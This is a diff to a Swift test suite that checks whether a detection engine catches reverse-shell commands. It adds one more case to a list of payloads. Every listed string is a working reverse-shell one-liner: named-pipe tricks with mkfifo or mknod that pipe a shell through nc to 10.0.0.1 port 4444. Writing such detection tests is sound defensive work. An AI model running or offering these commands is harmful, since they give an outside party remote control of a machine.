@@ -171,6 +171,7 @@ struct ReverseShellRuleCoverageTests {
             "mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.0.0.1 4444 >/tmp/f",        // mkfifo named-pipe (bash — rc.4-verify coverage)
             "mkfifo /tmp/f;cat /tmp/f|/bin/zsh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f",         // mkfifo named-pipe (zsh)
             "mknod /tmp/bp p; /bin/sh 0</tmp/bp | nc 10.0.0.1 4444 1>/tmp/bp",            // mknod named-pipe
+            "mkfifo /tmp/f; nc 10.0.0.1 4444 < /tmp/f | /bin/sh > /tmp/f",                // nc-LEADING backpipe (rc.5-verify)
         ]
         for cmd in payloads {
             let hit = await fires(engine, cmd)
